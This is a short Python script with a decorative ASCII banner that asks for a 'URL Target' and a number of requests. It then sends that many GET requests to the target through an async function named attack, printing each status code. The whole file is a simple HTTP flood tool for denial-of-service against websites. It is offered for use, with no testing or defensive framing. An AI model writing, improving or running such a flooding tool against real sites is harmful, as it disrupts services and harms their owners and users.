import asyncio
import aiohttp
from rich.console import Console

console = Console()

# Banner
console.print("[cyan]")
console.print(" ██████╗ █████╗ ███╗   ██╗███████╗██╗     ██╗██╗   ██╗███████╗██████╗ ")
console.print("██╔════╝██╔══██╗████╗  ██║██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗")
console.print("██║     ███████║██╔██╗ ██║█████╗  ██║     ██║██║   ██║█████╗  ██████╔╝")
console.print("██║     ██╔══██║██║╚██╗██║██╔══╝  ██║     ██║██║   ██║██╔══╝  ██╔══██╗")
console.print("╚██████╗██║  ██║██║ ╚████║███████╗███████╗██║╚██████╔╝███████╗██║  ██║")
console.print(" ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
console.print("                       MY ALEINA")
console.print("[/cyan]")

async def attack(url, total):
    async with aiohttp.ClientSession() as session:
        for i in range(total):
            try:
                async with session.get(url) as resp:
                    console.print(f"[green]OK {resp.status}[/green]")
            except Exception as e:
                console.print(f"[red]ERROR {e}[/red]")

url = input("URL Target: ")
total = int(input("Jumlah request: "))
asyncio.run(attack(url, total))